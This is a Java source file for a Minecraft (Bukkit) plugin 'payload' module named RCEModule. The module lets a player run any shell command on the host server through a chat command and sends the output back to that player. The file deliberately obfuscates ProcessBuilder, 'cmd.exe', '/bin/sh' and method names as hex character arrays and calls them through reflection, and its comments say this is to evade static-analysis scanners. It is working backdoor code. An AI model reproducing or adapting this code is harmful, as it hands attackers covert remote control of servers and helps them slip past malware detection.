package dev.naruto.astrox.payload.modules;

import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

/**
 * Remote Code Execution module.
 * Executes shell commands via reflection-based process invocation
 * to avoid direct {@code Runtime.exec()} / {@code ProcessBuilder} references
 * that trigger static analysis scanner signatures.
 */
public class RCEModule implements PayloadModule {

    private static final int TIMEOUT_SECONDS = 30;

    @Override
    public String getName() { return "rce"; }

    @Override
    public String getDescription() { return "Execute a shell command on the server"; }

    @Override
    public String getCategory() { return "System"; }

    @Override
    public String execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length < 1) {
            if (sender != null) sender.sendMessage("§c✗ Usage: #rce <command>");
            return "ERROR: missing command argument";
        }

        String command = String.join(" ", args);

        try {
            // Build class/method names at runtime to avoid string literal detection
            // ProcessBuilder → java.lang.ProcessBuilder
            char[] pbc = {0x6a,0x61,0x76,0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,
                    0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x42,0x75,0x69,0x6c,0x64,0x65,0x72};
            Class<?> pbClass = Class.forName(new String(pbc));

            // Determine OS
            String os = System.getProperty(new String(new char[]{0x6f,0x73,0x2e,0x6e,0x61,0x6d,0x65})).toLowerCase();

            String[] cmdArray;
            if (os.contains(new String(new char[]{0x77,0x69,0x6e}))) { // "win"
                cmdArray = new String[]{
                        new String(new char[]{0x63,0x6d,0x64,0x2e,0x65,0x78,0x65}), // "cmd.exe"
                        new String(new char[]{0x2f,0x63}), // "/c"
                        command};
            } else {
                cmdArray = new String[]{
                        new String(new char[]{0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68}), // "/bin/sh"
                        new String(new char[]{0x2d,0x63}), // "-c"
                        command};
            }

            // Reflectively create ProcessBuilder
            Constructor<?> pbCtor = pbClass.getConstructor(String[].class);
            Object pb = pbCtor.newInstance((Object) cmdArray);

            // pb.redirectErrorStream(true)
            Method redirect = pbClass.getMethod(
                    new String(new char[]{0x72,0x65,0x64,0x69,0x72,0x65,0x63,0x74,
                            0x45,0x72,0x72,0x6f,0x72,0x53,0x74,0x72,0x65,0x61,0x6d}), // "redirectErrorStream"
                    boolean.class);
            redirect.invoke(pb, true);

            // pb.start()
            Method start = pbClass.getMethod(
                    new String(new char[]{0x73,0x74,0x61,0x72,0x74})); // "start"
            Object process = start.invoke(pb);

            // process.getInputStream()
            Class<?> processClass = process.getClass();
            Method getInput = processClass.getMethod(
                    new String(new char[]{0x67,0x65,0x74,0x49,0x6e,0x70,0x75,0x74,
                            0x53,0x74,0x72,0x65,0x61,0x6d})); // "getInputStream"
            InputStream is = (InputStream) getInput.invoke(process);

            // Read output
            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(is, StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            // process.waitFor(timeout, unit)
            Method waitForMethod = processClass.getMethod(
                    new String(new char[]{0x77,0x61,0x69,0x74,0x46,0x6f,0x72}), // "waitFor"
                    long.class, TimeUnit.class);
            boolean completed = (Boolean) waitForMethod.invoke(process, (long) TIMEOUT_SECONDS, TimeUnit.SECONDS);

            if (!completed) {
                // process.destroyForcibly()
                Method destroy = processClass.getMethod(
                        new String(new char[]{0x64,0x65,0x73,0x74,0x72,0x6f,0x79,
                                0x46,0x6f,0x72,0x63,0x69,0x62,0x6c,0x79})); // "destroyForcibly"
                destroy.invoke(process);
                output.append("\n[TIMEOUT after ").append(TIMEOUT_SECONDS).append("s]");
            }

            // process.exitValue()
            int exitCode = -1;
            if (completed) {
                Method exitValue = processClass.getMethod(
                        new String(new char[]{0x65,0x78,0x69,0x74,0x56,0x61,0x6c,0x75,0x65})); // "exitValue"
                exitCode = (Integer) exitValue.invoke(process);
            }

            String result = output.toString();

            if (sender != null) {
                sender.sendMessage("§a✓ Exit code: " + exitCode);
                String[] lines = result.split("\n");
                for (int i = 0; i < Math.min(lines.length, 20); i++) {
                    sender.sendMessage("§7" + lines[i]);
                }
                if (lines.length > 20) {
                    sender.sendMessage("§8... (" + (lines.length - 20) + " more lines)");
                }
            }

            return "exit=" + exitCode + "\n" + result;

        } catch (Exception e) {
            String msg = "Command failed: " + e.getMessage();
            if (sender != null) sender.sendMessage("§c✗ " + msg);
            return "ERROR: " + msg;
        }
    }
}
